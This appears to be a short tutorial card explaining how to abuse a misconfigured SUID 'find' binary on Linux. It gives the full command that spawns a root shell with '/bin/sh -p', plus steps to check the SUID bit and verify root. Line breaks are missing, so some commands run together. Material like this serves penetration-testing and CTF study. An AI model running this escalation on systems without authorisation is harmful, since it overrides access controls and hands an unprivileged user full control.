Abusing SUID 'find' for Root Access

Gaining a Privileged Shell Through a Misconfigured Binary

How the Exploit Works

  • SUID `find`: Runs as root, allowing it to execute commands with root privileges.
  • `-exec` option: `find` executes a specified command for each item found.
  • `/bin/sh -p`: Spawns a privileged shell. The `-p` flag is crucial for preserving root's effective UID.
  • `-quit`: Exits `find` after the shell is spawned, preventing further execution.
Key Takeaway

A misconfigured SUID `find` binary can be exploited by using its `-exec` option to spawn a root shell, provided the `-p` flag is used with `/bin/sh`.

Verification

After executing the exploit, always verify your new privileges:

whoamiid

You should see 'root' as the user and UID 0.

Terminal: Exploiting SUID 'find'

# Step 1: Confirm SUID 'find' (example output)ls -l /usr/bin/find-rwsr-xr-x 1 root root 180K Jan 1 2023 /usr/bin/find# Step 2: Execute the exploit/usr/bin/find . -exec /bin/sh -p \; -quit# Step 3: Verify root accesswhoamiid
Common Mistake: Forgetting -p

Using `/bin/sh` or `/bin/bash` without the `-p` flag will likely result in a shell with your original low privileges, as it won't preserve the effective UID.
